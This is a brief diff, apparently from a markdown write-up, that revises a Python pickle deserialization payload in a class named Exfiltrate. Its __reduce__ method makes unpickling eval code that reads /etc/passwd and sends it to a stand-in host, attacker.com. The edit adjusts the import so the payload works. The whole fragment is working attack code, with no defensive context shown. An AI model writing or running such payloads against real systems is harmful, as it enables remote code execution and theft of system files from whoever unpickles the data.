@@ -135,7 +135,7 @@ class Exfiltrate:
     def __reduce__(self):
         return (
             eval,
-            ("__import__('urllib.request').urlopen('https://attacker.com/steal?data=' + open('/etc/passwd').read().replace('\\n', '%0A'))",)
+            ("__import__('urllib.request', fromlist=['urlopen']).urlopen('https://attacker.com/steal?data=' + open('/etc/passwd').read().replace('\\n', '%0A'))",)
         )
 ```
 
